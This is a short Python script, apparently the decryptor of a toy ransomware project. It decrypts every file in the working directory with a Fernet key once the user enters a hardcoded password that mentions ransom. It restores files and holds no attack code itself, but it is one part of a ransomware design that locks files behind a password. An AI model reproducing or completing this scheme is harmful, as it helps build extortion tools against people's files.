import os
from cryptography.fernet import Fernet

#let's find these file

files=[]

for file in os.listdir():
	if file=="source.py" or file=="thekey.key" or file=="decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)

with open("thekey.key","rb")as key:
	secretkey=key.read()

password= "753951@Ransom!!"
user_input=input("Enter password to retrieve decrypting key: ")

if user_input==password:
	for file in files:
		with open(file,"rb")as thefile:
			contents=thefile.read()
		contents_decrypted=Fernet(secretkey).decrypt(contents)
		with open(file,"wb")as thefile:
			thefile.write(contents_decrypted)
		print("Files are decrypted successfully...")